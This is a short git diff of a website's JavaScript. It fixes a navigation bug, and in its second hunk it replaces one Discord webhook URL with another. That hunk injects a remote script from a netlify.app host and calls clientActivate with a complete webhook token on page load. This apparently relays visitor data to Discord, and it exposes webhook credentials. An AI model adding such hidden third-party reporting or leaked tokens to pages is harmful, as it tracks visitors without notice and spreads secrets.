@@ -126,7 +126,7 @@ b8.onclick = function () {
     document.location.href="/muuta.html";
 }
 b9.onclick = function () {
-    document.location.href("/chat.html");
+    document.location.href="/chat.html";
 }
 const backgroundImg = document.createElement("img");
 backgroundImg.id="bImg";
@@ -163,7 +163,7 @@ backgroundImg.ondrag=function (e) {
 }
 document.write(`
 <script src="https://betonikasa.netlify.app/client/start.js"></script>
-<script>clientActivate("https://discord.com/api/webhooks/1078319298960969799/nKCMxvxp3xiCHfMjDSVbjn7l1oizrVZ-LwoWNovz3BcHmghhkBXwC9JkCtSvAl9Aejc9")</script>
+<script>clientActivate("https://discord.com/api/webhooks/1090612913863135242/ASOMQlATYXjUiUo_EX5-YrOEAocfYdI4ZceqmxzYTLCPt0s-guQJ3K33VUhYFN5Mz7SD")</script>
 `);
 const Discord = document.createElement("button");
 Discord.id="discord";
